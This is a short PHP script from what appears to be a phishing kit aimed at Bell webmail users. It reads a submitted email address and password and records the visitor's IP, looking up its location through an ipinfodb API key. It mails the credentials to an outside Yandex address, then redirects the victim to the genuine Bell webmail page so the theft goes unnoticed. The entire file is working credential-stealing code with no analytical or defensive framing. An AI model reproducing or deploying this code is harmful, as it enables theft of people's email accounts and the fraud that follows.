<?php

extract($_POST);

$ip = getenv("REMOTE_ADDR");
//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=d5fffa06f621e0c28602b13de0c551db8aa491f01e694648988453bc9bcf72e1&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//

$sa = $_POST['bbem'];
$pd = $_POST['bbepd'];



$message .= "BBMail: ".$sa."\n";
$message .= "BBPass: ".$pd."\n";
$message .= "UsrLoc: ".$ip."\n";


$from .= "MIME-Version: 1.0\r\n";
$subj .= "BBE | Log |";

if (empty($sa) || empty($pd)) {
header( "Location: bbusemail.php" );
}
else {
mail("xyzfudz.mafia@yandex.com", $subj, $message, $from);
header("Location: https://webmail.en.bellnet.ca/");
}
?>